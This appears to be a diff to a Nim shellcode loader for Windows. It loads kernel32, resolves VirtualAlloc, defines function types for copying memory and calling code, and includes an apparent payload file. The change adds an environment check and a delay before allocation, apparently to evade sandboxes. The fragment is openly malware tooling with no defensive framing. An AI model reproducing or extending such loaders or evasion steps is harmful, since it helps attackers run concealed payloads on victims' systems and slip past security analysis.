@@ -5,6 +5,7 @@
 import dynlib
 import winlean
 import strutils
+import os
 
 include bytes
 
@@ -13,6 +14,8 @@ type
   rtlMoveMemoryFun = proc (dest: pointer, src: pointer, length: Natural) {.stdcall.}
   codeFun = proc () {.gcsafe, stdcall.}
 
+checkEnv()
+sleep(wait_time)
 
 let kernel32 = loadLib("kernel32.dll")
 let virtualAlloc = cast[virtualAllocFun](kernel32.symAddr("VirtualAlloc"))
